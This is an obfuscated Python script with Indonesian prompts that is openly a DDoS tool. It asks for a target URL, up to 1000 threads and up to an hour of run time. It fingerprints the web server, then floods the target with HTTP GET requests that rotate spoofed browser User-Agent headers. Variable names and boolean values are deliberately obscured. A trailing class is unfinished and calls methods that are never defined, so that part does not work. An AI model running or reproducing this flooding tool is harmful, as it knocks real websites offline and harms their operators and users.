lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl, llllllllllllIII = Exception, int, range, bool, input, ValueError, print, str

from requests import head as IIllIIIlIIIIll, Timeout as llllIIlIlIlllI, Session as IIllllIIIIIIIl, get as IlIIIIIIlIIIll, ConnectionError as llllllllIlIllI
from time import time as IIIIIllIIIIllI
from random import choice as llIlIIIIIlIIll
from threading import Thread as IllIlIIllIlIII

def IIIlIlIlllIllIIllI(IlIlllIIlllIIIIIII):
    try:
        IIIIIlllIIIIIllllI = IIllIIIlIIIIll(IlIlllIIlllIIIIIII, timeout=5)
        lIllIlIllIlIIIIlll = IIIIIlllIIIIIllllI.headers.get('Server', 'Tidak Terdeteksi')
        llllllllllllIIl(f'Jenis Web Server yang terdeteksi: {lIllIlIllIlIIIIlll}')
        return lIllIlIllIlIIIIlll
    except llllIIlIlIlllI:
        llllllllllllIIl('Timeout: Server tidak merespons dalam waktu yang ditentukan')
        return
    except llllllllIlIllI:
        llllllllllllIIl('Koneksi gagal: Tidak dapat terhubung ke server')
        return
    except lllllllllllllll as IIlIIllIIllllIIlll:
        llllllllllllIIl(f'Error tidak terduga: {llllllllllllIII(IIlIIllIIllllIIlll)}')
        return

def lllllllIlllIIlIlll(lIlIlIllllIllIlIll):
    lIllIlIllIlIIIIlll = llllllllllllIll(f'Web server terdeteksi sebagai {lIlIlIllllIllIlIll}. Lanjutkan serangan DDoS? (y/n): ')
    return lIllIlIllIlIIIIlll.lower() == 'y'

def llIIllIlIIIllllIII(IlIlllIIlllIIIIIII, lIlIlIllllIllIlIll, IIllllIIIIllIIlIlI, IIIllIlIlIIIlIIllI):
    IIlIIllIIllllIIlll = IIIIIllIIIIllI() + IIIllIlIlIIIlIIllI
    IIlIIIlIlllIllIlll = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)', 'Mozilla/5.0 (Android 10; Mobile; rv:68.0)']

    def IIIIIllIlllIIIlIII():
        while IIIIIllIIIIllI() < IIlIIllIIllllIIlll:
            try:
                lIllIlIllIlIIIIlll = {'User-Agent': llIlIIIIIlIIll(IIlIIIlIlllIllIlll), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive'}
                IIIIIlllIIIIIllllI = IlIIIIIIlIIIll(IlIlllIIlllIIIIIII, headers=lIllIlIllIlIIIIlll, timeout=5)
                llllllllllllIIl(f'Status: {IIIIIlllIIIIIllllI.status_code}')
            except lllllllllllllll as IIIIIllIlllIIIlIII:
                llllllllllllIIl(f'Request gagal: {llllllllllllIII(IIIIIllIlllIIIlIII)}')
    IIIIIlllIIIIIllllI = []
    for IlIIlllIlIlIIIIlIl in lllllllllllllIl(IIllllIIIIllIIlIlI):
        lIllIlIllIlIIIIlll = IllIlIIllIlIII(target=IIIIIllIlllIIIlIII)
        IIIIIlllIIIIIllllI.append(lIllIlIllIlIIIIlll)
        lIllIlIllIlIIIIlll.start()
    for lIllIlIllIlIIIIlll in IIIIIlllIIIIIllllI:
        lIllIlIllIlIIIIlll.join()

def lIIIIIIlIllIIIllII():
    while lllllllllllllII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1):
        try:
            lIllIlIllIlIIIIlll = llllllllllllIll('Masukkan URL target: ')
            if not lIllIlIllIlIIIIlll.startswith(('http://', 'https://')):
                llllllllllllIIl('URL harus dimulai dengan http:// atau https://')
                continue
            IIIIIlllIIIIIllllI = llllllllllllllI(llllllllllllIll('Masukkan jumlah thread (1-1000): '))
            if not 1 <= IIIIIlllIIIIIllllI <= 1000:
                llllllllllllIIl('Jumlah thread harus antara 1-1000')
                continue
            IIlIIllIIllllIIlll = llllllllllllllI(llllllllllllIll('Masukkan durasi waktu serangan dalam detik (1-3600): '))
            if not 1 <= IIlIIllIIllllIIlll <= 3600:
                llllllllllllIIl('Durasi harus antara 1-3600 detik')
                continue
            return (lIllIlIllIlIIIIlll, IIIIIlllIIIIIllllI, IIlIIllIIllllIIlll)
        except llllllllllllIlI:
            llllllllllllIIl('Input tidak valid. Mohon masukkan angka untuk thread dan durasi.')
(IlIlllIIlllIIIIIII, IIllllIIIIllIIlIlI, IIIllIlIlIIIlIIllI) = lIIIIIIlIllIIIllII()
lIlIlIllllIllIlIll = IIIlIlIlllIllIIllI(IlIlllIIlllIIIIIII)
if lIlIlIllllIllIlIll:
    if lllllllIlllIIlIlll(lIlIlIllllIllIlIll):
        llllllllllllIIl(f'Memulai serangan DDoS ke server jenis {lIlIlIllllIllIlIll} pada {IlIlllIIlllIIIIIII} dengan {IIllllIIIIllIIlIlI} thread selama {IIIllIlIlIIIlIIllI} detik...')
        llIIllIlIIIllllIII(IlIlllIIlllIIIIIII, lIlIlIllllIllIlIll, IIllllIIIIllIIlIlI, IIIllIlIlIIIlIIllI)
    else:
        llllllllllllIIl('Serangan dibatalkan oleh pengguna.')
else:
    llllllllllllIIl('Gagal mendeteksi jenis web server. Tidak dapat melanjutkan serangan.')

class lIIIlIlIlIlIllllll:

    def __init__(lIllIlIllIlIIIIlll, IlIlllIIlllIIIIIII, llIIllIIIIIIllIIIl, IlllllllIIlIlIlIII):
        lIllIlIllIlIIIIlll.IlIlllIIlllIIIIIII = IlIlllIIlllIIIIIII
        lIllIlIllIlIIIIlll.llIIllIIIIIIllIIIl = llIIllIIIIIIllIIIl
        lIllIlIllIlIIIIlll.IlllllllIIlIlIlIII = IlllllllIIlIlIlIII
        lIllIlIllIlIIIIlll.session = IIllllIIIIIIIl()
        lIllIlIllIlIIIIlll.start_time = None
        lIllIlIllIlIIIIlll.end_time = None

    def lllllIIlIIlIIlllII(lIllIlIllIlIIIIlll):
        lIllIlIllIlIIIIlll.lIlIlIllllIllIlIll = lIllIlIllIlIIIIlll.IIIlIlIlllIllIIllI()
        if not lIllIlIllIlIIIIlll.lIlIlIllllIllIlIll:
            return lllllllllllllII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)
        return lllllllllllllII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1)

    def IlIIlllllIlllIllIl(lIllIlIllIlIIIIlll):
        if not lIllIlIllIlIIIIlll.lllllIIlIIlIIlllII():
            return
        lIllIlIllIlIIIIlll.start_time = IIIIIllIIIIllI()
        lIllIlIllIlIIIIlll.end_time = lIllIlIllIlIIIIlll.start_time + lIllIlIllIlIIIIlll.IlllllllIIlIlIlIII
        IIlIIllIIllllIIlll = []
        for IIlIIIlIlllIllIlll in lllllllllllllIl(lIllIlIllIlIIIIlll.llIIllIIIIIIllIIIl):
            IIIIIlllIIIIIllllI = IllIlIIllIlIII(target=lIllIlIllIlIIIIlll.lIlIIIllIIIIlIIIlI)
            IIlIIllIIllllIIlll.append(IIIIIlllIIIIIllllI)
            IIIIIlllIIIIIllllI.start()
        for IIIIIlllIIIIIllllI in IIlIIllIIllllIIlll:
            IIIIIlllIIIIIllllI.join()

    def lIlIIIllIIIIlIIIlI(lIllIlIllIlIIIIlll):
        while IIIIIllIIIIllI() < lIllIlIllIlIIIIlll.end_time:
            try:
                lIllIlIllIlIIIIlll._send_request()
            except lllllllllllllll as IIIIIlllIIIIIllllI:
                lIllIlIllIlIIIIlll._handle_error(IIIIIlllIIIIIllllI)
